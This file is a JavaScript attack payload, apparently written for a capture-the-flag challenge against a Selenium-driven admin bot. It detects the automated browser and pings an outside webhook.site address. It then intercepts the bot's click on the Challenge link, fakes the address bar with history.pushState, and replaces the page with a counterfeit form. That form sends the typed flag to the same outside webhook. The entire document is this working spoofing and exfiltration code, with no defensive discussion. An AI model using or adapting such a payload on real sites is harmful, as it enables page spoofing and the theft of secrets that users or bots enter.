
(() => {
    if (navigator.webdriver) {
    location.href = 'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04?stage=selenium_loaded';
    }
    // Only run on the Scoreboard
    if (location.pathname !== '/') return;

    const link = document.querySelector('a[href="/challenge"]');
    if (!link) return;

    // Intercept the bot clicking Challenge
    link.addEventListener('click', e => {
        e.preventDefault();
        e.stopImmediatePropagation();

        // Make Selenium see the expected URL
        history.pushState({}, '', '/challenge');

        // Replace Scoreboard with the expected form
        document.querySelector('.content').innerHTML = `
            <fieldset>
                <form
                    action="https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04"
                    method="GET"
                >
                    <input name="flag" autocomplete="off">
                    <input type="hidden" name="id" value="1">
                    <input type="submit" value="Submit">
                </form>
            </fieldset>
        `;
    }, true);
})();
